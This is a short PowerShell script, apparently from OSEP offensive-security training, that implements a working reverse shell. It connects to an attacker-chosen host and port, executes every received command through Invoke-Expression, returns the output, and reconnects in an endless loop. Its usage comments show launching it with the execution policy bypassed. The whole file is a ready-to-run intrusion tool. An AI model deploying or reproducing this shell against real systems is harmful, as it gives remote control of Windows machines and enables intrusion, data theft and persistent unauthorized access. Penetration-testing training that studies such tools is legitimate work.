# OSEP - Standalone PowerShell reverse shell
# Run directly: powershell -nop -ep bypass -f ps_revshell.ps1 -lhost 10.10.10.5 -lport 443
# Or dot-source: . .\ps_revshell.ps1 ; Invoke-RevShell -lhost 10.10.10.5 -lport 443
param(
    [string]$lhost = "",
    [int]   $lport = 0
)

$LOG = "C:\Windows\Temp\osep_log.txt"
function wl { param($m,$l="INFO"); try{Add-Content $LOG "[$((Get-Date).ToString('HH:mm:ss'))][PS][$l] $m" -EA SilentlyContinue}catch{} }

function Invoke-RevShell {
    param(
        [Parameter(Mandatory)][string]$lhost,
        [Parameter(Mandatory)][int]   $lport,
        [int]$delay = 5
    )

    wl "Starting -> ${lhost}:${lport}"

    while ($true) {
        try {
            $c = New-Object Net.Sockets.TCPClient($lhost, $lport)
            $s = $c.GetStream()
            $b = New-Object byte[] 65536    # New-Object syntax works PS2+
            wl "Connected"

            while (($n = $s.Read($b, 0, $b.Length)) -gt 0) {
                $cmd = (New-Object Text.ASCIIEncoding).GetString($b, 0, $n).Trim()
                wl "CMD: $($cmd.Substring(0,[Math]::Min(60,$cmd.Length)))"

                $out = try { Invoke-Expression $cmd 2>&1 | Out-String } catch { "ERROR: $_" }

                $reply = $out + "`nPS $((Get-Location).Path)> "
                $bytes = [Text.Encoding]::ASCII.GetBytes($reply)
                $s.Write($bytes, 0, $bytes.Length)
                $s.Flush()
            }
            $c.Close()
            wl "Disconnected"
        } catch {
            wl "Failed: $_" "ERR"
        }
        Start-Sleep -Seconds $delay
    }
}

# Self-execute if called directly with -lhost/-lport
if ($lhost -ne "" -and $lport -ne 0) {
    Invoke-RevShell -lhost $lhost -lport $lport
}
